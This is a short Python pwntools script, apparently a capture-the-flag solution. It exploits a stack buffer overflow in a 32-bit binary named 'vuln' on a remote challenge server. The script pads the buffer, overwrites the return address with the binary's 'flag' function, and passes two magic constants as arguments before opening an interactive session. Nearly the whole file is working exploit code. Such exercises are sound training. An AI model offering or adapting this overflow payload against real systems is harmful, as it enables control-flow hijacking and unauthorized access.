#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./vuln")
elf = ELF("./vuln")
p = remote('142.93.40.197', 31743)

flag = elf.symbols['flag']
log.info("flag: " + hex(flag))

pay = 'A'*(0xB8+0x4)
pay += '\xe2\x91\x04\x08' # 0x80491e2
pay += 'B'*4 # first parameter
pay += '\xEF\xBE\xAD\xDE'
pay += '\x0D\xD0\xDE\xC0'

p.sendafter(": \n", pay)

#gdb.attach(p)
p.interactive()
